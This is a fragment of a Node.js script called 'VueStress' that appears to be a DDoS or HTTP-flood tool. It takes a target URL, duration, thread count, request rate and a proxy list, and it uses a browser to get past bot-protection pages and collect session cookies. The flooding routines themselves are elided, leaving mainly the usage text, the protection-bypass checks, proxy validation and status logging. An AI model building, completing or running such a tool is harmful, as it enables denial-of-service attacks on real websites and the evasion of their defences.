...
if (process.argv.length < 6) {
    console.log('['.gray + 'Vue'.brightGreen + 'Stress'.white + ']  '.gray + 'Incorrect usage!'.brightGreen);
    console.log('['.gray + 'Vue'.brightGreen + 'Stress'.white + ']  '.gray + 'Usage: '.brightGreen + `node index.js [URL] [Time] [Threads] [RATE] [Proxy File]`.white)
    console.log('['.gray + 'Vue'.brightGreen + 'Stress'.white + ']  '.gray + 'Example: '.brightGreen + `node index.js https://grafana.ventox.lol 300 15 64 proxy.txt`.white)
    process.exit(0);
}
    ...
    try {
        ...
        */
        ...
        if (title == 'Just a moment...' || title == 'Access denied' || title == 'Problem loading page') {
            ...
            log('['.gray + 'Vue'.red + 'Stress'.white + ']  '.gray + 'Status received'.red + ' -> '.white + `${title}`.red);
        } else {
            if (JS) {
                log('['.gray + 'Vue'.yellow + 'Stress'.white + ']  '.gray + `Protection detected`.yellow + ` -> `.white + `${JS.name}`.yellow);
            } else {
                log('['.gray + 'Vue'.green + 'Stress'.white + ']  '.gray + 'No JS/Captcha'.green)
            }

            log('['.gray + 'Vue'.green + 'Stress'.white + ']  '.gray + 'Browser got Title'.green + ' -> '.white + `${title}`.green);
            log('['.gray + 'Vue'.green + 'Stress'.white + ']  '.gray + 'Browser got Cookies'.green + ' -> '.white + `${cookie}`.green);
            log('['.gray + 'Vue'.green + 'Stress'.white + ']  '.gray + 'Session Solved!'.green);
...
function check_proxy(proxy) {
    request({
        ...
        if (!err) {
            ...
            log('['.gray + 'Vue'.brightMagenta + 'Stress'.white + ']  '.gray + `Added new proxy`.brightMagenta + ' -> '.white + `${proxy} `.magenta + '('.white + `${res.elapsedTime} ms`.brightMagenta + ')'.white);
        }
    });
}
...
function main() {
    log('['.gray + 'Vue'.brightBlue + 'Stress'.white + ']  '.gray + `Target`.brightBlue + ' -> '.white + `${urlT}`.brightBlue);
    log('['.gray + 'Vue'.brightBlue + 'Stress'.white + ']  '.gray + `Time`.brightBlue + ' -> '.white + `${timeT}`.brightBlue);
    log('['.gray + 'Vue'.brightBlue + 'Stress'.white + ']  '.gray + `Threads (Sessions)`.brightBlue + ' -> '.white + `${threadsT}`.brightBlue);
    log('['.gray + 'Vue'.brightBlue + 'Stress'.white + ']  '.gray + `Proxy File`.brightBlue + ' -> '.white + `${proxyT}`.brightBlue);
    log('['.gray + 'Vue'.cyan + 'Stress'.white + ']  '.gray + `Starting browser...`.cyan);
